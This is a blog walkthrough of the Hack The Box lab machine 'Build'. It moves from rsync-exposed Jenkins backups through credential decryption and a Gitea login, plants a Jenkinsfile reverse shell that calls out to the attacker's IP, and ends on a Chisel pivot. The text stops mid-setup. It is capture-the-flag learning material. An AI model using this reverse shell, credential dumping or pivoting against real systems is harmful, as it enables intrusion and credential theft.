---
title: Build
date: 2026-04-19
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - Linux
lastmod: 2026-04-26T07:13:09.401Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Build" >}}

***

# Recon

### \[\[PORT & IP SCAN]]

The `nmap` reveal that the machine is ((change it) a standard Windows AD Server , with the kerberos auth , also the ldap query , and the 3389 port show that the domain `AWSJPDC0522.shibuya.vl` ,but the ldap anonymous inquiry failed .)

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  nmap -p- -vvv --min-rate 10000 10.129.234.169 

Not shown: 65526 closed tcp ports (reset)
PORT     STATE    SERVICE         REASON
22/tcp   open     ssh             syn-ack ttl 63
53/tcp   open     domain          syn-ack ttl 62
512/tcp  open     exec            syn-ack ttl 63
513/tcp  open     login           syn-ack ttl 63
514/tcp  open     shell           syn-ack ttl 63
873/tcp  open     rsync           syn-ack ttl 63
3000/tcp open     ppp             syn-ack ttl 62
3306/tcp filtered mysql           no-response
8081/tcp filtered blackice-icecap no-response
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=4/23%OT=22%CT=1%CU=31108%PV=Y%DS=2%DC=I%G=Y%TM=69EA223
OS:7%P=aarch64-unknown-linux-gnu)SEQ(SP=F9%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=
OS:A)OPS(O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M5
OS:42ST11NW7%O6=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE8
OS:8)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
OS:40%CD=S)

Uptime guess: 38.791 days (since Mon Mar 16 02:45:39 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=249 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/share/nmap
OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.73 seconds
           Raw packets sent: 91891 (4.044MB) | Rcvd: 86651 (3.467MB)



```

### DNS 53

The DNS dont have the response

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ netexec smb 10.129.234.169  --generate-hosts-file hosts
                                                               
```

### Port 3000

Only the port 3000 is allow to browser , i also tried port , but dont have any helpful infomation\
![Pasted image 20260423214734.png](/ob/Pasted%20image%2020260423214734.png)\
i will check the tech stack , source ccode , and the use brute-force, finally to try the sing-in or register function

Although the 404 page and wappalyzer dont help me to find anything , but the `whatweb` can show the the site is build by Gitea, aslo the first page is the bug hint ! ...

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ whatweb  http://10.129.234.169:3000/ 
http://10.129.234.169:3000/ [200 OK] Cookies[_csrf,i_like_gitea], Country[RESERVED][ZZ], HTML5, HttpOnly[_csrf,i_like_gitea], IP[10.129.234.169], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN]       
```

Always Check the source is a good habit , so i found the CMS version

![Pasted image 20260423215723.png](/ob/Pasted%20image%2020260423215723.png)

But seem like not much the version is easily to be exploited !\
![Pasted image 20260423215950.png](/ob/Pasted%20image%2020260423215950.png)

### Port 873

Port 873 is the ==default TCP port for the **[rsync daemon (service) mode](https://www.google.com/search?client=firefox-b-d\&q=rsync+daemon+%28service%29+mode\&mstk=AUtExfBZazdGih4n8jIL6tq2EfZTqZiNzcD3EL1H6kdCFvw_6rECEDPbvZxNjewa5-BEtBrRy_XcrRCKCVmrZhuwUbulo7BKLBkzUwm_Bk8Vl7tuhN0MZur3Xxok29eHc97HIRTeCW8p_s77Rb-e9NAwtE2rgevbqivh1BNqZaVxJAkv7hs\&csui=3\&ved=2ahUKEwj2suu8mISUAxWr2DQHHY2oEacQgK4QegQIARAC)**==, designed for fast, efficient, and incremental file synchronization, often used in network backups, mirroring, and data distribution.

Discovering Public Modules

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ rsync rsync://10.129.234.169       
backups         backups
```

Listing Files Inside a Module

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ rsync rsync://10.129.234.169/backups
drwxr-xr-x          4,096 2024/05/02 21:26:31 .
-rw-r--r--    376,289,280 2024/05/02 21:26:19 jenkins.tar.gz
```

Downloading Files from a Module

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ rsync -av rsync://10.129.234.169/backups/jenkins.tar.gz  .               
receiving incremental file list
jenkins.tar.gz
rsync: [receiver] write error: Broken pipe (32)
rsync error: received SIGINT, SIGTERM, or SIGHUP (code 20) at io.c(1701) [sender=3.2.7]

sent 47 bytes  received 376,381,250 bytes  786,585.78 bytes/sec
total size is 376,289,280  speedup is 1.00

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ tar -xvf jenkins.tar.gz
jenkins_configuration/
jenkins_configuration/jenkins.model.ArtifactManagerConfiguration.xml
jenkins_configuration/hudson.plugins.git.GitTool.xml
jenkins_configuration/secrets/
jenkins_configuration/secrets/master.key
jenkins_configuration/secrets/hudson.util.Secret
jenkins_configuration/secrets/hudson.model.Job.serverCookie
jenkins_configuration/secrets/org.jenkinsci.plugins.workflow.log.ConsoleAnnotators.consoleAnnotator
jenkins_configuration/secrets/hudson.console.ConsoleNote.MAC
jenkins_configuration/secrets/jenkins.model.Jenkins.crumbSalt
jenkins_configuration/secrets/org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY
jenkins_configuration/secrets/hudson.console.AnnotatedLargeText.consoleAnnotator
jenkins_configuration/jenkins.fingerprints.GlobalFingerprintConfiguration.xml
jenkins_configuration/org.jenkinsci.plugins.workflow.flow.GlobalDefaultFlowDurabilityLevel.xml
jenkins_configuration/plugins/
jenkins_configuration/plugins/email-ext.jpi
jenkins_configuration/plugins/handy-uri-templates-2-api.jpi
jenkins_configuration/plugins/credentials-binding.jpi
jenkins_configuration/plugins/ws-cleanup/

```

jenkins 's users list is the classic attack path

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/jenkins_configuration]
└─$ cat users/users.xml 
<?xml version='1.1' encoding='UTF-8'?>
<hudson.model.UserIdMapper>
  <version>1</version>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>admin</string>
      <string>admin_8569439066427679502</string>
    </entry>
  </idToDirectoryNameMap>
</hudson.model.UserIdMapper>                                
```

There’s one user admin, with a directory name `admin_8569439066427679502`. admin’s configuration is stored at `users/admin_8569439066427679502/config.xml`, and includes a password hash:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/jenkins_configuration]
└─$ cat users/admin_8569439066427679502/config.xml 
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <jenkins.console.ConsoleUrlProviderUserProperty/>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1337.v60b_d7b_c7b_c9f">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.204.vf6fddd8a_8b_e9">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>5a9e1f21231c806b</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>
    <hudson.model.TimeZoneProperty/>
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
      <flags/>
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@472.vf7c289a_4b_420">
      <emailAddress>admin@build.vl</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
  </properties>
</user>                                   
```

I’ll throw this into `hashcat` with mode 3200

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/jenkins_configuration]
└─$ echo '$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG' > admin.hashes

```

With the credit cannot log in in the ssh , let see the attack path in the jenkins

jenkins also has the build to know what actual doing what

#### Jobs

the directory of Jobs in jenkins is for core, automated units of work—ranging from code builds and testing to deployment

in the /jenkins\_configuration/jobs/build  's config.xml  is for connecting to a Gitea server at 172.18.0.2:3000:

{{< code >}}

<?xml version='1.1' encoding='UTF-8'?>

\<jenkins.branch.OrganizationFolder plugin="branch-api@2.1163.va\_f1064e4a\_a\_f3">\ <actions/>\ <description>dev</description>\ <displayName>dev</displayName>\ <properties>\
\<jenkins.branch.OrganizationChildHealthMetricsProperty>\ <templates>\
\<com.cloudbees.hudson.plugins.folder.health.WorstChildHealthMetric plugin="cloudbees-folder@6.901.vb\_4c7a\_da\_75da\_3">\ <nonRecursive>false</nonRecursive>\
\</com.cloudbees.hudson.plugins.folder.health.WorstChildHealthMetric>\ </templates>\
\</jenkins.branch.OrganizationChildHealthMetricsProperty>\
\<jenkins.branch.OrganizationChildOrphanedItemsProperty>\ <strategy class="jenkins.branch.OrganizationChildOrphanedItemsProperty$Inherit"/>\
\</jenkins.branch.OrganizationChildOrphanedItemsProperty>\
\<jenkins.branch.OrganizationChildTriggersProperty>\ <templates>\
\<com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger plugin="cloudbees-folder@6.901.vb\_4c7a\_da\_75da\_3">\ <spec>H H/4 \* \* *</spec>\ <interval>86400000</interval>\
\</com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger>\ </templates>\
\</jenkins.branch.OrganizationChildTriggersProperty>\
\<com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider\_-FolderCredentialsProperty plugin="cloudbees-folder@6.901.vb\_4c7a\_da\_75da\_3">\ <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">\ <entry>\
\<com.cloudbees.plugins.credentials.domains.Domain plugin="credentials@1337.v60b\_d7b\_c7b\_c9f">\ <specifications/>\
\</com.cloudbees.plugins.credentials.domains.Domain>\
\<java.util.concurrent.CopyOnWriteArrayList>\
\<com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl plugin="credentials@1337.v60b\_d7b\_c7b\_c9f">\ <id>e4048737-7acd-46fd-86ef-a3db45683d4f</id>\ <description></description>\ <username>buildadm</username>\ <password>{AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=}</password>\ <usernameSecret>false</usernameSecret>\
\</com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>\
\</java.util.concurrent.CopyOnWriteArrayList>\ </entry>\ </domainCredentialsMap>\
\</com.cloudbees.hudson.plugins.folder.properties.FolderCredentialsProvider\_-FolderCredentialsProperty>\
\<jenkins.branch.NoTriggerOrganizationFolderProperty>\ <branches>.*</branches>\ <strategy>NONE</strategy>\
\</jenkins.branch.NoTriggerOrganizationFolderProperty>\ </properties>\ <folderViews class="jenkins.branch.OrganizationFolderViewHolder">\ <owner reference="../.."/>\ </folderViews>\ <healthMetrics/>\ <icon class="jenkins.branch.MetadataActionFolderIcon">\ <owner class="jenkins.branch.OrganizationFolder" reference="../.."/>\ </icon>\ <orphanedItemStrategy class="com.cloudbees.hudson.plugins.folder.computed.DefaultOrphanedItemStrategy" plugin="cloudbees-folder@6.901.vb_4c7a_da_75da_3">\ <pruneDeadBranches>true</pruneDeadBranches>\ <daysToKeep>-1</daysToKeep>\ <numToKeep>-1</numToKeep>\ <abortBuilds>false</abortBuilds>\ </orphanedItemStrategy>\ <triggers>\
\<com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger plugin="cloudbees-folder@6.901.vb\_4c7a\_da\_75da\_3">\ <spec>\* \* \* \* \*</spec>\ <interval>60000</interval>\
\</com.cloudbees.hudson.plugins.folder.computed.PeriodicFolderTrigger>\ </triggers>\ <disabled>false</disabled>\ <navigators>\
\<org.jenkinsci.plugin.gitea.GiteaSCMNavigator plugin="gitea@1.4.7">\ <serverUrl>http://172.18.0.2:3000</serverUrl>\ <repoOwner>buildadm</repoOwner>\ <credentialsId>e4048737-7acd-46fd-86ef-a3db45683d4f</credentialsId>\ <traits>\
\<org.jenkinsci.plugin.gitea.BranchDiscoveryTrait>\ <strategyId>1</strategyId>\
\</org.jenkinsci.plugin.gitea.BranchDiscoveryTrait>\
\<org.jenkinsci.plugin.gitea.OriginPullRequestDiscoveryTrait>\ <strategyId>1</strategyId>\
\</org.jenkinsci.plugin.gitea.OriginPullRequestDiscoveryTrait>\
\<org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait>\ <strategyId>1</strategyId>\ <trust class="org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait$TrustContributors"/>\
\</org.jenkinsci.plugin.gitea.ForkPullRequestDiscoveryTrait>\ </traits>\
\</org.jenkinsci.plugin.gitea.GiteaSCMNavigator>\ </navigators>\ <projectFactories>\
\<org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProjectFactory plugin="workflow-multibranch@773.vc4fe1378f1d5">\ <scriptPath>Jenkinsfile</scriptPath>\
\</org.jenkinsci.plugins.workflow.multibranch.WorkflowMultiBranchProjectFactory>\ </projectFactories>\ <buildStrategies/>\ <strategy class="jenkins.branch.DefaultBranchPropertyStrategy">\ <properties class="empty-list"/>\ </strategy>\
\</jenkins.branch.OrganizationFolder>\
{{< /code >}}

#### secrets

using the https://github.com/hoto/jenkins-credentials-decryptor to dumping Jenkins credentials.

download the script

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  curl -L \
  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.2/jenkins-credentials-decryptor_1.2.2_$(uname -s)_$(uname -m)" \
   -o jenkins-credentials-decryptor
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100      9 100      9   0      0     65      0                              0

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ chmod +x jenkins-credentials-decryptor 
                                                
```

It needs the master key, the Hudson secret, and the config file:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ ./jenkins-credentials-decryptor -m jenkins_configuration/secrets/master.key -s jenkins_configuration/secrets/hudson.util.Secret -c jenkins_configuration/jobs/build/config.xml 
[
  {
    "id": "e4048737-7acd-46fd-86ef-a3db45683d4f",
    "password": "Git1234!",
    "username": "buildadm"
  }
]                                               
```

### Port 3000

The cred can be logined as the buildadm

![Pasted image 20260423234629.png](/ob/Pasted%20image%2020260423234629.png)

Discovering the file will run the sh , i will try to give the revshell to replace\
![Pasted image 20260423234738.png](/ob/Pasted%20image%2020260423234738.png)

It is worked !!

![Pasted image 20260424000645.png](/ob/Pasted%20image%2020260424000645.png)

```
sh 'bash -c "/bin/sh -i >& /dev/tcp/10.10.16.39/3000 0>&1"'
```

![Pasted image 20260424000717.png](/ob/Pasted%20image%2020260424000717.png)

The hostname is twelve hex characters, which matches the Docker default. There’s a `.dockerenv` file in the filesystem root:

```
# uname -a 
Linux 5ac6c7d6fb8e 5.15.0-144-generic #157-Ubuntu SMP Mon Jun 16 07:33:10 UTC 2025 x86_64 GNU/Linux
# hostname
5ac6c7d6fb8e
# 
```

`ip` and `ifconfig` are not installed, but the IP is 172.18.0.3: , but can view it in `/proc/net/fib_trie`

```
# cat /proc/net/fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/30 2 0 2
           |-- 172.18.0.0
              /16 link UNICAST
           |-- 172.18.0.3
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.18.0.0/16 2 0 2
        +-- 172.18.0.0/30 2 0 2
           |-- 172.18.0.0
              /16 link UNICAST
           |-- 172.18.0.3
              /32 host LOCAL
        |-- 172.18.255.255
           /32 link BROADCAST
```

I’ll grab a copy of a [static compiled nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and upload it to the container:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ wget https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap                   
--2026-04-25 13:59:15--  https://github.com/andrew-d/static-binaries/raw/refs/heads/master/binaries/linux/x86_64/nmap
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/andrew-d/static-binaries/refs/heads/master/binaries/linux/x86_64/nmap [following]
--2026-04-25 13:59:16--  https://raw.githubusercontent.com/andrew-d/static-binaries/refs/heads/master/binaries/linux/x86_64/nmap
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5944464 (5.7M) [application/octet-stream]
Saving to: ‘nmap’

nmap                                        100%[=========================================================================================>]   5.67M  5.94MB/s    in 1.0s    

2026-04-25 13:59:18 (5.94 MB/s) - ‘nmap’ saved [5944464/5944464]

```

I’ll also want a copy of `/etc/services` from my host:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cp  /etc/services .
                               
```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

```
# curl 10.10.16.39/services -o /etc/services  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 12990  100 12990    0     0  27337      0 --:--:-- --:--:-- --:--:-- 27289
# curl 10.10.16.39/nmap -o ./nmap  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 5805k  100 5805k    0     0   612k      0  0:00:09  0:00:09 --:--:--  991k
# 

```

```
# ./nmap 172.18.0.0/24 --min-rate 10000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-04-25 06:06 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000016s latency).
Not shown: 1150 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
873/tcp  open  rsync
3306/tcp open  mysql
8081/tcp open  tproxy
MAC Address: 02:42:F1:38:36:C9 (Unknown)

Nmap scan report for gitea.custom (172.18.0.2)
Host is up (0.000036s latency).
Not shown: 1157 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:AC:12:00:02 (Unknown)

Nmap scan report for pdns-db-1.custom (172.18.0.4)
Host is up (0.000035s latency).
Not shown: 1157 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
MAC Address: 02:42:AC:12:00:04 (Unknown)

Nmap scan report for pdns-pdns-1.custom (172.18.0.5)
Host is up (0.000029s latency).
Not shown: 1156 closed ports
PORT     STATE SERVICE
53/tcp   open  domain
8081/tcp open  tproxy
MAC Address: 02:42:AC:12:00:05 (Unknown)

Nmap scan report for powerdns_admin.custom (172.18.0.6)
Host is up (0.000060s latency).
Not shown: 1157 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:12:00:06 (Unknown)

Nmap scan report for 5ac6c7d6fb8e (172.18.0.3)
Host is up (0.0000070s latency).
Not shown: 1157 closed ports
PORT     STATE SERVICE
8080/tcp open  http-alt

Nmap done: 256 IP addresses (6 hosts up) scanned in 2.06 seconds

```

* .1 - Host, with all the same ports are my initial scan. 3000 is missing as it’s not in the top ports scanned by default, and 3306 and 8081 open not filtered. Probably nothing unique here.
* .2 - `nmap` above shows SSH only, but another scan of all ports shows 3000 as well. This is Gitea.
* .3 - Webserver on 8080 is the Jenkins webhook from Gitea.
* .4 - 3306 open is MySQL.
* .5 - `nmap` shows both 53 and 8081, which is an interesting combination. `curl` on 8081 returns just a 401 unauthorized.
* .6 - Some kind of webserver on 80. A quick `curl` of this port redirects to `/login`, which shows a title of PowerDNS-Admin. This could be related to the open DNS ports on .5.

I’ll use [Chisel](https://github.com/jpillora/chisel) to create a proxy through my reverse shell to access the other containers from my VM. I’ll start the server on my host with `--reverse` to allow reverse connections and `-p 8000` because Burp is already listening on the default port of 8080 on my host. Next I’ll upload the latest Linux binary to the container, make it executable, and connect:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ wget https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz  
--2026-04-25 14:12:59--  https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_darwin_amd64.gz
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/31311037/92c1be0b-1fd1-44f3-b850-66d04c417e92?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-04-25T07%3A03%3A18Z&rscd=attachment%3B+filename%3Dchisel_1.11.5_darwin_amd64.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-04-25T06%3A02%3A35Z&ske=2026-04-25T07%3A03%3A18Z&sks=b&skv=2018-11-09&sig=VTOLrtYCGUuaONDcyLH7WEdFWpdSxwaB5h4cfMuScQ0%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3NzA5Nzg4MCwibmJmIjoxNzc3MDk3NTgwLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.kozeG-oG7B68s_oc0D1JJDA1v8Bjr21QDO-XUi8juuc&response-content-disposition=attachment%3B%20filename%3Dchisel_1.11.5_darwin_amd64.gz&response-content-type=application%2Foctet-stream [following]
--2026-04-25 14:13:00--  https://release-assets.githubusercontent.com/github-production-release-asset/31311037/92c1be0b-1fd1-44f3-b850-66d04c417e92?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-04-25T07%3A03%3A18Z&rscd=attachment%3B+filename%3Dchisel_1.11.5_darwin_amd64.gz&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-04-25T06%3A02%3A35Z&ske=2026-04-25T07%3A03%3A18Z&sks=b&skv=2018-11-09&sig=VTOLrtYCGUuaONDcyLH7WEdFWpdSxwaB5h4cfMuScQ0%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3NzA5Nzg4MCwibmJmIjoxNzc3MDk3NTgwLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.kozeG-oG7B68s_oc0D1JJDA1v8Bjr21QDO-XUi8juuc&response-content-disposition=attachment%3B%20filename%3Dchisel_1.11.5_darwin_amd64.gz&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.108.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4384759 (4.2M) [application/octet-stream]
Saving to: ‘chisel_1.11.5_darwin_amd64.gz’

chisel_1.11.5_darwin_ 100%[======================>]   4.18M  3.93MB/s    in 1.1s    

2026-04-25 14:13:01 (3.93 MB/s) - ‘chisel_1.11.5_darwin_amd64.gz’ saved [4384759/4384759]

                                                                                     
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ gunzip  chisel_1.11.5_linux_amd64.gz 
```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ python3 -m http.server 80

```

```
# curl 10.10.16.39/chisel_1.11.5_linux_amd64  -o c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   335  100   335    0     0    366      0 --:--:-- --:--:-- --:--:--   366
# 

```

```
# chmod +x ./c
# ./c client 10.10.16.39:8000 R:socks
2026/04/25 06:20:54 client: Connecting to ws://10.10.16.39:8000
2026/04/25 06:20:54 client: Connection error: dial tcp 10.10.16.39:8000: connect: connection refused
2026/04/25 06:20:54 client: Retrying in 100ms...
2026/04/25 06:20:55 client: Connection error: dial tcp 10.10.16.39:8000: connect: connection refused (Attempt: 1/unlimited)
2026/04/25 06:20:55 client: Retrying in 200ms...

```

for my mac arm64

```
  
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ ./chisel_1.11.5_linux_arm64 server --reverse --port 8000
2026/04/25 14:29:23 server: Reverse tunnelling enabled
2026/04/25 14:29:23 server: Fingerprint 9C8xIGKsuRJSzN68+VYbeYQEg9GNgGpZbwP+6j/+3K4=
2026/04/25 14:29:23 server: Listening on http://0.0.0.0:8000
2026/04/25 14:32:49 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo apt install proxychains4
proxychains4 is already the newest version (4.17-3+b1).
The following packages were automatically installed and are no longer required:
  amass-common              libfuse2t64            libmjpegutils-2.1-0t64  librubberband2     libwiretap15                          python3-protobuf
  curlftpfs                 libgav1-1              libmongoc-1.0-0t64      libsframe1         libwsutil16                           python3-pysmi
  firmware-ti-connectivity  libgdal36              libmpeg2encpp-2.1-0t64  libsigsegv2        mesa-vdpau-drivers                    python3-terminaltables
  gir1.2-girepository-2.0   libgdata-common        libmplex2-2.1-0t64      libsnmp40t64       pocketsphinx-en-us                    python3-xlrd
  libarmadillo14            libgdata22             libmupdf25.1            libsoup-2.4-1      python3-bluepy                        python3-xlutils
  libaudio2                 libgdk-pixbuf2.0-bin   libnet1                 libsoup2.4-common  python3-click-plugins                 python3-xlwt
  libavfilter10             libgeos3.13.1          libobjc-14-dev          libsphinxbase3t64  python3-fs                            python3-yaswfp
  libavformat61             libgirepository-1.0-1  libogdi4.1              libsqlcipher1      python3-gpg                           python3-zombie-imp
